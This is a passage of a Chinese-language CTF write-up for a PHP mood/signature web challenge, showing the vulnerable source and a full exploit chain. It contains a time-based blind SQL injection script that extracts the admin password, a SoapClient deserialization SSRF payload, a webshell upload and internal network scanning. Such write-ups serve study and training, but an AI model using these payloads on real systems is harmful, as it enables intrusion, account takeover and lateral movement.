language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> =  <span class="string">&#x27;delete from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_single</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span>,<span class="variable">$column</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;update &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; set `&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;` = \&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mood</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mood</span>, <span class="variable">$ip</span>, <span class="variable">$date</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$mood</span>, <span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mood = <span class="variable">$mood</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ip  = <span class="variable">$ip</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getcountry</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $ip = @file_get_contents(&quot;http://ip.taobao.com/service/getIpInfo.php?ip=&quot;.$this-&gt;ip);</span></span><br><span class="line">        <span class="comment">// $ip = json_decode($ip,true);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;glzjin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getsubtime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$now_date</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="variable">$sub_date</span> = (<span class="keyword">int</span>)<span class="variable">$now_date</span> - (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="variable">$days</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>/<span class="number">86400</span>);</span><br><span class="line">        <span class="variable">$hours</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>/<span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$minutes</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>%<span class="number">3600</span>/<span class="number">60</span>);</span><br><span class="line">        <span class="variable">$res</span> = (<span class="variable">$days</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$days</span> days <span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:((<span class="variable">$hours</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:<span class="string">&quot;<span class="subst">$minutes</span> minutes ago&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;addslashes_deep&#x27;</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_s</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> .= <span class="variable">$chars</span>[ <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>) ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_GET</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_GET</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_POST</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">        <span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addsla_all</span>();</span><br></pre></td></tr></table></figure><p><strong>publish.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$C</span>-&gt;<span class="title function_ invoke__">check_login</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?action=login&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$C</span>-&gt;is_admin==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$res</span> = @<span class="variable">$C</span>-&gt;<span class="title function_ invoke__">publish</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ok&#x27;);self.location=&#x27;index.php?action=index&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;something error&#x27;);self.location=&#x27;index.php?action=publish&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">            &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">            &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">            &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?action=logout&quot;</span>&gt;logout&lt;/a&gt;</span><br><span class="line">        &lt;center&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">action</span>=<span class="title">profile</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">C</span>-&gt;<span class="title">username</span>; ?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h3</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&#x27;<span class="title">post</span>&#x27; <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">action</span>=<span class="title">publish</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;<span class="title">Please</span> <span class="title">input</span> <span class="title">your</span> <span class="title">signature</span>: &lt;<span class="title">br</span>&gt;&lt;<span class="title">textarea</span> <span class="title">name</span>=&quot;<span class="title">signature</span>&quot;&gt;&lt;/<span class="title">textarea</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;<span class="title">Please</span> <span class="title">choose</span> <span class="title">your</span> <span class="title">mood</span>: &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">mood</span>&quot; <span class="title">value</span>=&quot;0&quot; <span class="title">checked</span>=&quot;<span class="title">checked</span>&quot; /&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">img</span>/0.<span class="title">gif</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">mood</span>&quot; <span class="title">value</span>=&quot;1&quot; /&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">img</span>/1.<span class="title">gif</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">mood</span>&quot; <span class="title">value</span>=&quot;2&quot; /&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">img</span>/2.<span class="title">gif</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Submit</span>&quot;/&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">             &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>?<span class="title">action</span>=<span class="title">index</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&#x27;<span class="title">img</span>/<span class="title">home</span>.<span class="title">png</span>&#x27;&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">else</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$C</span>-&gt;username.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Orz...大佬果然进来了!&lt;br&gt;但jaivy说flag不在这,要flag,来内网拿...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$res</span> = @<span class="variable">$C</span>-&gt;<span class="title function_ invoke__">publish</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ok&#x27;);self.location=&#x27;index.php?action=publish&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;something error&#x27;);self.location=&#x27;index.php?action=publish&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">                &lt;form method=<span class="string">&#x27;post&#x27;</span> action=<span class="string">&quot;index.php?action=publish&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                    &lt;p&gt;Please upload a pictrue: &lt;br&gt;&lt;input name=<span class="string">&#x27;pic&#x27;</span> type=<span class="string">&#x27;file&#x27;</span>&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在user.php中，在publish页面传入的signature参数没有做校验，导致signature可控</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182016489.png" alt="image-20250318201640284" loading="lazy"></p><p>查看config.php中的insert函数，首先调用get_column()将$values数组用’,’拼接，在通过preg_replace()将两个匹配的’（中间不包含，）替换为’</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182030430.png" alt="image-20250318203023350" loading="lazy">                                            </p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182030081.png" alt="image-20250318203031025" loading="lazy"></p><p>我们可以构造1&#96;使得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`id`,`name`,`1``,`mood`   ==&gt;  &#x27;id&#x27;,&#x27;name&#x27;,&#x27;1&#x27;`,&#x27;mood&#x27;</span><br></pre></td></tr></table></figure><p>提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1`</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182033200.png" alt="image-20250318203358157" loading="lazy"></p><p>我们提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1`,1)#</span><br></pre></td></tr></table></figure><p>提示ok，说明sql注入存在</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182034153.png" alt="image-20250318203448106" loading="lazy"></p><p>我们从user.php中的register函数获得表名和列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="title function_ invoke__">get_ip</span>(),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)); <span class="comment">//No one could be admin except me</span></span><br></pre></td></tr></table></figure><p>python脚本获取admin密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://ce283c4e-25f1-47a3-b00f-465788a3662a.node4.buuoj.cn:81/index.php?action=publish&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;t5rculf6qdcd7ksgif8s8e4sj1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">k=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>): </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> k:</span><br><span class="line">        j = <span class="built_in">ord</span>(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;mood&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;signature&#x27;</span>:<span class="string">&#x27;1`,if(ascii(substr((select password from ctf_users where username=`admin`),&#123;&#125;,1))=&#123;&#125;,sleep(3),0))#&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url,data=data,cookies=cookie,timeout=(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来密码的md5为：c991707fdf339958eded91331fb11ba0</p><p>网站解密为jaivypassword</p><p>我们知道了admin和password，我们登录看看</p><p>登录admin后，提示需要本地登录</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182049898.png" alt="image-20250318204933844" loading="lazy"></p><p>访问&#x2F;index.php?action&#x3D;phpinfo，发现开启soap扩展。SoapClient类内置__call()，触发后可以发送HTTP和HTTPS请求，可用于SSRF。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">soap反序列化利用</a></p><p><img src="https://img2022.cnblogs.com/blog/2158663/202203/2158663-20220301233223206-933692787.jpg" alt="img" loading="lazy"></p><p>在user。php的showmess()使用了unserialize，反序列化的内容为ctf_user_signature中的mood列的数据，由于前面功能存在sql注入，导致mood可控</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182102610.png" alt="image-20250318210255538" loading="lazy"></p><p>使用另一个浏览器开启一个新的窗口，将新的窗口的cookie及code填入对应位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;username=admin&amp;password=jaivypassword&amp;code=1194911&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=124l5i5jsqsa7vuetnmikdtsp2&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用原来的test用户发布签名</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182115938.png" alt="image-20250318211543824" loading="lazy"></p><p>然后刷新刚刚使用那应该浏览器开启的新的窗口，admin登录成功</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182116151.png" alt="image-20250318211616106" loading="lazy"></p><p>点击publish，发现文件上传，提示flag在内网</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182116550.png" alt="image-20250318211641510" loading="lazy"></p><p>上传图片马，bp修改后缀为php，访问&#x2F;upload&#x2F;</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182128746.png" alt="image-20250318212823689" loading="lazy"></p><p>使用蚁剑连接，我们执行ifconfig</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182128791.png" alt="image-20250318212853694" loading="lazy"></p><p>使用设置蚁剑代理为burp的代理，使用端口扫描插件，扫描10.224.80.227，将抓取到的报文发至intruder，探测C段主机</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182133390.png" alt="image-20250318213346255" loading="lazy"></p><p>发现10.244.80.255开启80端口</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182134068.png" alt="image-20250318213410973" loading="lazy"></p><p>执行蚁剑终端执行<code>curl http://10.244.80.225/</code></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182134041.png" alt="image-20250318213451918" loading="lazy"></p><p>再执行<code>curl http://10.244.80.225/ &gt; 1.html</code>，并访问，为php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sandbox</span> = 